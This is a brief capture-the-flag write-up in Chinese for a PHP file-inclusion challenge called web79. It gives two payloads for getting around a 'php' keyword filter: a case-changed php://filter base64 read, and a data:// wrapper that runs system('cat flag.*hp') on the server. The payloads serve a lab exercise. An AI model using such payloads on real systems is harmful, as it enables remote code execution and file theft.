# web79
![](vx_images/334190554880084.png)
将php变为???,变为大写绕过
```
?file=Php://filter/read=convert.base64-encode/resource=flag.Php
```
会报错,那就用
```
/?file=data://text/plain,<?=system('cat flag.*hp')?>
```
f12查看源码
![](vx_images/550774308190966.png)